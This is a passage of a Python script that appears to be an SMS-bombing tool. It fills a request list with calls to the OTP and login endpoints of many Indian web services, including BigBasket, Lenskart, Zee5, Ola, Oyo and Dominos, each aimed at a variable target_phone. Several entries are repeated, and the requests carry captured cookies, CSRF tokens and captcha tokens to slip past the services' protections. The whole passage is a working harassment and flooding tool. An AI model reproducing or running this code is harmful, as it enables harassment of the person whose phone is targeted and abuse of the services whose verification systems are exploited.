            "cookie": "G_ENABLED_IDPS=google; _uetvid=304ac2c0191211ebb4d2cbc446845671; _uetsid=30481cb0191211ebac307b72fd063244; WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A2%2C%22s%22%3A1603885148%2C%22t%22%3A1603885159%7D; sessionId=1603885159122; __cfruid=349d4cbcb4077b53c92af99cd2a8ea17832e3c5d-1603885151; rgn=%7B%22regionCode%22%3A%22ABOR%22%2C%22regionName%22%3A%22Abohar%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22abohar%22%2C%22regionCodeSlug%22%3A%22abor%22%2C%22Lat%22%3A%2230.1453%22%2C%22Long%22%3A%2274.1993%22%7D; overrideArea=%22true%22; userNotified=false; _gat_UA-27207583-8=1; tvc_bmscookie_gid=GA1.2.1463184875.1603885148; tvc_bmscookie=GA1.2.323425446.1603885148; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1603885147662.1946366717; WZRK_G=0cf00ce388574ff6ba9d04426bc06a73; _gcl_au=1.1.1582607514.1603885145; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; bmsId=1.613310084.1603885142414; __cfduid=d7a425d4143ee46199b515af6a6b0c8581603885142"
        },
        "data": {"channel": "phone", "subChannel": "sms", "details": {"phone": target_phone, "origin": "https://in.bookmyshow.com"}}
    })

    # 34. BigBasket
    requests_list.append({
        "method": "POST",
        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "headers": {
            "Host": "www.bigbasket.com",
            "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "x-channel": "BB-PWA",
            "content-type": "application/json",
            "origin": "https://www.bigbasket.com",
            "cookie": "adb=0; G_ENABLED_IDPS=google; bigbasket.com=9431754c-9582-4b9f-b24b-532a320f74f7; ts=\"2020-09-22 13:20:05.803\"; _fbp=fb.1.1600761006368.1940593604; _gcl_au=1.1.1149181141.1600761003; bb_home_cache=a85e99f3.431.visitor; _bb_rd=1; _bb_rdt=\"MzEzOTUwNDU2Ng==.1\"; _bb_aid=\"MzE5NTMyMDU0Nw==\"; _bb_tc=1; sessionid=bjd52bw7pig7mpw92e621b4nmbjllpdg; _bb_hid=454; _client_version=2321; data=%7B%22referrerInPageContext%22%3A%22backbtn%22%7D; _gat_gtag_UA_27455376_1=1; _gid=GA1.2.467547806.1600760997; _ga=GA1.2.1059142911.1600760997; bb_home_cache=a85e99f3.431.visitor; csrftoken=gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED; _bb_cid=27; _bb_dsid=; _bb_vid=MzgxMTEyNTc0OA==; _bb_nhid=454; _bb_loid=j:null; PWA=1; _bb_locSrc=akamai"
        },
        "data": {"identifier": target_phone}
    })

    # 35. Flomattress
    requests_list.append({
        "method": "POST",
        "url": "https://cod.flomattress.com/api/otp",
        "headers": {
            "Host": "cod.flomattress.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.flomattress.com"
        },
        "data": f"number={target_phone}&store=hushbedding.myshopify.com"
    })

    # 36. Banggood
    requests_list.append({
        "method": "POST",
        "url": "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
        "headers": {
            "Host": "m.banggood.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://m.banggood.in",
            "cookie": "akaas_WWW1ABTestS=1600784215~rv=86~id=142dea7c39dcdf1aa52b02a9edb65857; _sctr=1|1600713000000; cto_bundle=B7YX1V9xWSUyRldtWUJzY1VIWGlhOHphUDlBTiUyQjZFcUNVeG0zQkx5d3RRQ3owTjl6SWJPOXhrcDlEWnZYRU56VXV4RG4wS0M3TG51amtLclhqMzUxclpzR3lPVjdIQnVJWkJBJTJCRSUyQm9XQ1JZRUp1cWZkWGhOaHV1UmMya2RKcnZGSGFQQ3NDWFB6Y0YlMkZONExtJTJCeFUwS3NneU95TnclM0QlM0Q; _pin_unauth=dWlkPVl6WXpNakF6TVRRdE0yUXpaaTAwTVRCa0xUZ3pNVE10TmpZNU5qTmhOMkZsTldZNSZycD1abUZzYzJV; _fbp=fb.1.1600762304817.979546076; _scid=930e7858-2b7d-47c6-a7b0-4306a8a4efa7; _gat_gtag_UA_130998589_1=1; _gat=1; _uetvid=4faf4aa86abe62cd3ce3e8cb0e169210; _uetsid=df92279395a7aff562f9f533491d5452; rec_sid=3795718099|1600762296; __bgvisit=1600762296137|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|null; _bg_w_c=b7a49103f1e175e2914b67e6ddb19ad5; installBGAPP=1; _gid=GA1.2.1887335251.1600762290; _ga=GA1.2.2008480368.1600762290; SearchWare=WyJ1c2EiLCJ1ayIsImhrIiwiYXUiLCJmciIsImd3dHIiLCJlcyIsInJ1IiwiY3oiLCJhZSJd; new_user=1; _gcl_au=1.1.1822847057.1600762288; __bgresource=affiliate; rec_uid=1578453606|1600762285; __bguser=1600762284904|1560641939780|1560641939780|1600762284904; __bgqueue=1600762284904|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|0|; __bgcookie=0|; countryCookie=%7B%22code%22%3Anull%2C%22name%22%3Anull%2C%22currency%22%3A%22INR%22%2C%22zone_id%22%3A%22%22%2C%22zone_code%22%3A%22%22%2C%22zone_name%22%3A%22%22%7D; currency=INR; _bgLang=en-GB; WebApp_SID=7f9e857355eff99028eb4e66c2d4e9d2"
        },
        "data": f"mobilePhone={target_phone}&countryPhoneCode=91&type=1&verifyCode=KmUu"
    })

    # 37. Lenskart (two requests)
    for _ in range(2):
        requests_list.append({
            "method": "POST",
            "url": "https://api.lenskart.com/v2/customers/sendOtp",
            "headers": {
                "Host": "api.lenskart.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "origin": "https://www.lenskart.com",
                "x-api-client": "mobilesite"
            },
            "data": {"telephone": target_phone}
        })

    # 38. UrbanClap
    requests_list.append({
        "method": "POST",
        "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        "headers": {
            "Host": "www.urbanclap.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.urbancompany.com"
        },
        "data": {"country_id": "IND", "phone": {"isd_code": "+91", "phone_wo_isd": target_phone}, "device_type": "customer"}
    })

    # 39. Zee5 (GET)
    requests_list.append({
        "method": "GET",
        "url": f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target_phone}",
        "headers": {
            "Host": "b2bapi.zee5.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "origin": "https://www.zee5.com"
        }
    })

    # 40. Quikr
    requests_list.append({
        "method": "POST",
        "url": "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        "headers": {
            "Host": "www.quikr.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://www.quikr.com",
            "cookie": "__utmb=119021961.4.9.1603857402954; _jk_id=ff9d1bcb-918d-49f4-bb9b-bb5a8f6628f7.1603857388.1.1603857388.; _fbp=fb.1.1603857388273.785408433; _gcl_au=1.1.1726929010.1603857388; __utmt=1; __utmz=119021961.1603857384.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=119021961; __utma=119021961.1718379111.1603857381.1603857384.1603857384.1; __redirectUrl=https%3A%2F%2Fwww.quikr.com%2F; _gat_quikrRUMTracker=1; _gat_quikrCrossCategoryRecommendationTracker=1; _gat_quikrPWATracker=1; utmztrack=utmcsr%3D%28direct%29%7Cutmccn%3D%28direct%29%7Cutmcmd%3D%28none%29; abRandMobile=23; _gid=GA1.2.355756152.1603857381; _ga=GA1.2.1718379111.1603857381; __at=eb75a6ee-1fbe-4f22-9b01-fc6fd80be4b0; brsampl=79253.79107; abRand=17; new_prefer_city=www; prefer_city_id=1"
        },
        "data": f"user={target_phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true"
    })

    # 41. Kotak (two requests)
    requests_list.append({
        "method": "POST",
        "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        "headers": {
            "Host": "www.kotak.com",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.kotak.com",
            "cookie": "JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1603857484%2C%22t%22%3A1603857484%7D; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334; _fbp=fb.1.1603857484947.174573870; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1; _gat_gtag_UA_4203568_53=1"
        },
        "data": f"cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={target_phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"
    })
    requests_list.append({
        "method": "POST",
        "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
        "headers": {
            "Host": "www.kotak.com",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "origin": "https://www.kotak.com",
            "cookie": "JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _fbp=fb.1.1603857484947.174573870; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1!ewD-u9AjS-WPbaOPvAM_cw.18641.1; _gat_gtag_UA_4203568_53=1; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A4%2C%22s%22%3A1603857484%2C%22t%22%3A1603857661%7D; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334"
        }
    })

    # 42. Happyeasygo
    requests_list.append({
        "method": "GET",
        "url": f"https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target_phone}&verifycode=FDCA",
        "headers": {
            "Host": "m.happyeasygo.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "x-device": "mobile",
            "origin": "https://m.happyeasygo.com",
            "cookie": "G_ENABLED_IDPS=google; _gat_UA-93580804-7=1; _uetvid=50664fb0190e11ebb0434db0b4466b92; _uetsid=50641740190e11eb93bb73bbfb574f40; refurl=; _gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB; _gid=GA1.2.1298233779.1603883483; _ga=GA1.2.2010415513.1603883483; deviceId=96146d25-169e-4be3-a11e-de78b43c37fd; _fbp=fb.1.1603883483792.1510659266; _gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB; _gid=GA1.3.1298233779.1603883483; _ga=GA1.3.2010415513.1603883483; _gcl_au=1.1.417055803.1603883482; _gcl_aw=GCL.1603883482.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB"
        }
    })

    # 43. Makemytrip
    requests_list.append({
        "method": "POST",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        "headers": {
            "Host": "mapi.makemytrip.com",
            "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "currency": "inr",
            "language": "eng",
            "authorization": "h4nhc9jcgpAGIjp",
            "visitor-id": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "region": "in",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.makemytrip.com",
            "cookie": "s_sess=%20s_cmp_pages%3DSEM%257CM%257CDF%257CG%257CBrand%257CB_M_Makemytrip_Search_Exact%257CBrand_Top_5_Exact%257CExpanded%257C456320328656%3B%20cf%3D0%3B%20s_cc%3Dtrue%3B%20tp%3D676%3B%20s_ppv%3Dmbls_login_main_page%252C100%252C100%252C676%3B%20s_sq%3D%3B; s_pers=%20s_vnum%3D1604169000439%2526vn%253D1%7C1604169000439%3B%20s_depth%3D2%7C1603885492899%3B%20s_lv%3D1603883718996%7C1698491718996%3B%20s_lv_s%3DFirst%2520Visit%7C1603885518996%3B%20gpv_pn%3Dmbls_login_main_page%7C1603885519074%3B%20s_invisit%3Dtrue%7C1603885519097%3B%20s_nr3650%3D1603883719122-New%7C1919243719122%3B%20s_nr30%3D1603883719143-New%7C1606475719143%3B%20s_nr120%3D1603883719165-New%7C1614251719165%3B%20s_nr7%3D1603883719184-New%7C1604488519184%3B; bm_sv=C55140AA532E879E48FCE510EE4D7DFF~ar2Vkg/OEbzM/D2nEqG/q8NfolxN2lT4jdwuq9kbaw6Tuq5FQYggkN0oj238T8DDz8B9tjhoS7x+gAeJZEYuk6pS7CoFG1ngKE98ixgNFYuy5rZmzgRRGnApQMkkSPSL72SPF8hOh7H36cQSSdSBxqwEQ7zqNHoNcmk64t8iRfg=; _adck_id=4fdb6d7c-9cc8-41f2-8a93-b1b6f24b2979; _adserveruser_ad_id=null; _abck=49DFEEA10F4B82F89F83D09A62D84093~0~YAAQ1I0sMV3UOF51AQAAEx7qbgR+qzQDIDykr/YDveVroz7mYwgAaZxdGb4DKZI+XVXbqxnMwvLUNljt0F+sBTCuNX2s+rCcOZX42twjRBXH01LU8XmNd6Zufo5oiukzBKZOnOeMgbrmNr14BDQ/GLLjzCil125zxH+ak99ZI+eFo7BMlvC1WNwjhKOLCYA4O6Qson1O1nk3CorsBYDcqWOJpKAjmz8uaWmxdOz7hRJWoWKZ+uTPwM2Crf1SLmbiHMyzdSZlUIbyiLP55CZu/9DRccG6d3zhbH/BXDCFsQS+8xtZTEzD+NOaxEeIwoNuP5p1Y+Q+dmtt8IQ=~-1~||-1||~-1; AMCV_1E0D22CE527845790A490D4D%40AdobeOrg=-1712354808%7CMCIDTS%7C18564%7CMCMID%7C69122668996877728323838859128273339164%7CMCAAMLH-1604488429%7C12%7CMCAAMB-1604488429%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1603890831s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.3.0; fltTab=0; s_ecid=MCMID%7C69122668996877728323838859128273339164; AMCVS_1E0D22CE527845790A490D4D%40AdobeOrg=1; __gads=ID=4141333fb27e4dcd-226b07d86cc400a7:T=1603883628:RT=1603883628:S=ALNI_MYC4HXzq54mQHuH7P1shgEPYe8btg; ak_bmsc=CEAADF4288BCF11000CCB857AACE172E312C8DD4063900006952995F9AE7425D~plocqnTjE8cA1UCnji3Iq2NSbY1TlDRS8GbpKYzYXN7+Zt0tH9LY1NltyfjaZhBvwoj3OAtYp9ehHi0gUJUctXr9b8mu0M8Cqt8vfBcAomTxwsglrGu6Zy2D9m4ItJhPvPH8LvduQoR4nLbtSeGZZFmhYCy+RdMUvrbHzZD1vvTQEH7SOGjc/U6IkFa1HBYIdv5XjZ6eK7ihBjxWpjC0HSnympSSx3Cz35mKjQScBOXT8qFJ/g8/+AcmiNtyWn+aD4nDoOtBbdzO92QTD1yv8Sbg==; _gcl_au=1.1.373807621.1603883626; pokusCached=78a1c8959dfd54a3a69e965db4d4da6a3c0a1097; htlVer=1; fltVer=2; npwah=true; dvid=a3d2f892-af4d-40d1-808a-db6286b8fe1f; ccde=IN; bm_sz=8FFF4F9C8A322ED4914209E8181B1D7F~YAAQ1I0sMRLUOF51AQAARO3pbgmJT+1zmwKJs3TfxPV+kweFcHWgWFauhszrF6NDaeLmW2Yd4MVklBIbygarp94vmeRIzOUaQ3z94CkPrk74kcDh06j1VlqamLjLkI+QylO7DqkdyQAOX3TIQ8z3qEfh6VEoRm0ova+DbVvewNUb9IZpa5T0XQfTCMV9dEnVpZdpug=="
        },
        "data": {"loginId": target_phone, "type": "MOBILE", "version": 2, "countryCode": "91"}
    })

    # 44. Ola
    requests_list.append({
        "method": "POST",
        "url": "https://accounts.olacabs.com/api/login",
        "headers": {
            "Host": "accounts.olacabs.com",
            "x-fingerprint-id": "3664542227",
            "csrf-token": "v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://accounts.olacabs.com",
            "cookie": "_gat=1; XSRF-TOKEN=v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I; _csrf=OBHlYhT8CZfAjUv8sp7YTWD4; OSRN_v1=WAVlPOqlGgDrpQZWrwT_V0yT; _gid=GA1.2.788616267.1603884269; _ga=GA1.2.687045355.1603884269"
        },
        "data": {"mobileNumber": target_phone, "dialingCode": "+91", "countryCode": "IN", "headers": {}, "verificationId": None, "captchaInfo": {"gcaptcha": "03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA", "fingerPrint": 3664542227, "storageId": "16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}}
    })

    # 45. Easemytrip
    requests_list.append({
        "method": "POST",
        "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        "headers": {
            "Host": "mybookings.easemytrip.com",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "cookie": "__stbpnenable=1; __stgeo=\"0\"; __stdf=0; __stp={\"visit\":\"new\",\"uuid\":\"714d955e-c9df-48b4-9853-a750c4edcf9e\"}; __sts={\"sid\":1603884684538,\"tx\":1603884684538,\"url\":\"https%3A%2F%2Fmybookings.easemytrip.com%2FMyBooking%2FProfile\",\"pet\":1603884684538,\"set\":1603884684538}; G_ENABLED_IDPS=google; _fbp=fb.1.1603884682032.457003053; _gat_UA-12090546-1=1; _gac_UA-12090546-1=1.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB; _gid=GA1.2.2094904679.1603884681; _ga=GA1.2.1719065224.1603884681; _gcl_au=1.1.99797182.1603884681; _gcl_aw=GCL.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB; __auc=7870b1471756efa07a40cd4466a; __asc=7870b1471756efa07a40cd4466a; _uetvid=1a44f9b0191111eb9e83c9c023ddc55d; _uetsid=1a43e630191111ebaef7a5a12cec5701; CusId=20201028170123; ReferalCookie=Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB|||||https://www.google.com/"
        },
        "data": f"{{\"emailph\":\"{target_phone}\"}}"
    })

    # 46. Oyo (two requests)
    for _ in range(2):
        requests_list.append({
            "method": "POST",
            "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
            "headers": {
                "Host": "www.oyorooms.com",
                "xsrf-token": "vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0" if _ == 0 else "boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "text/plain;charset=UTF-8",
                "origin": "https://www.oyorooms.com",
                "cookie": "bm_sv=51FB5B26188E3B1A010377CA066F396A~CdOf94m28FvrgJlHsOMLxibMoTRC6EFtC5/w4xrbhmR4D0PcjfY9g2ihtdKEB4OHQqnE2Jjbp7KppArQqMLTuh+CeqTXDufQJWSEKy1TuQT4rsT/uvtN+faeGA8IknJCYpnCGnu6xc7xWjjXStxNJ5so+CPy/9VEGNXKBijJ73A=; cto_bundle=dW5EdV9uQVJFR0l6ck03aGJiODZUNEJaNnlvSTZnSWZyN2Z5UTIyYnVMOERvMGhVRjBLVnR1TGE2TzRPczZEYXpsJTJGTkVQeFFHV0F5Z3B0anA3WXhGV0U0d1BObVdFOWZZZmxtJTJGYjJUSTZ6VnBzSUpneGp1cmJXQk1GclUlMkZPWHY0SUlrNFhmVWVpUU5DM0RpaCUyQmVWRG8lMkJURHRnJTNEJTNE; isHomepageViewed=true; XSRF-TOKEN=boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk; expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A0%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0; moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899; _gat=1; _gid=GA1.2.699494446.1604562049; _ga=GA1.2.amp-tFq7fxKPkXNa-cpIDmePQBTOwAeIzBBnke122oC9lel3Qtmxqes1NIPJmeZgfdPf; AMP_TOKEN=AHTRwNPhj7EtxJyD_RuBPs0ZuKIjp3o66t2xkKdQ5e3etnndiGTnnnnQ_AubASePzWJrB0U9UG1kI8wAwUavSq4w; ak_bmsc=0C93250BD2DE35694F06122DB2E120D2173A5D9DAD03000075ACA35FE266D14F~plySTVe+pT2eOrbJN47u/7i+QwcW0RcnGWTJz6IJ0GQQVUl1MO9HBlgBFSOEw7ao237yJL+waqU3yDA7Jm+KjV4ekkL8Dt2uiMmfcnOp5EIdpmDl6M0mh2hknzbcuwESX4baJYGwNMQknsOdvsW9gm8t3gyXg1dUHALioONwH94dicpzxiMVpJOeFXIeodlgSmz1W5PZMOXVsESZMqDQG1oWejFGAWxv15uNJ7XGBOHpHHfMu+AP7s++/owSlZgpvOec+17LzcnFiONwLWS53X1Q==; bm_mi=572BF703EB3A8A3CCE6E5FD82C29C478~51QSzfNmDn5IBhYqDJrzVU3WLdDQOteJiUPFoVQzy6NZNTnU1F7cPWvTpHcAkbvjhkg3RolB8h/HSpaiGGjWv70EjySjqm29iAcceWKMAHFnNKIDOwquTXIkWJaGRnVARK4t/XWBuPOctTVN8zyBpYjQFaN43JKN0ZPtxlAIUJWn16nQxpCePxcya77BAObWGX0fNvVpVhhL+YFu921bU4HaJeMF2XXwditZEPfZk1/d1g9XNrcgT42oEcIxATz1SY3VB8wGazeROpsY0sd8gR3gl4IJZmOMK4sy0L+3rfM=; ql=false; _uid=Not%20logged%20in; _csrf=m7_2j5oJ99S-vPQepeMS7NuS; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DUP%2Ccity%3DNOIDA%2Clat%3D28.57%2Clong%3D77.32%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; acc=IN; connect.sid=s%3AyIOWYcRpe2dpqYe6TkC2AP5LpxUGjTuO.tGRFa%2B%2BrE%2F5l51ClfuEVJ6kPoE4KoCaIUFvzRzVHZ7c; _fbp=fb.1.1603884913496.917081192; tvc_utm_content=(not set); tvc_utm_key=(not set); tvc_utm_campaign=(not set); tvc_utm_medium=organic; tvc_utm_source=google; _gcl_au=1.1.933447383.1603884913; fingerprint2=d4f670396357a34731ad7e9b3ea2be0c; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; mab=2e11992dc4c54dd59fe36360f6447c97"
            },
            "data": {"phone": target_phone, "country_code": "+91", "nod": 4}
        })

    # 47. Dominos
    requests_list.append({
        "method": "POST",
        "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
        "headers": {
            "Host": "api.dominos.co.in",
            "api_key": "d2aeb489bb8df385",
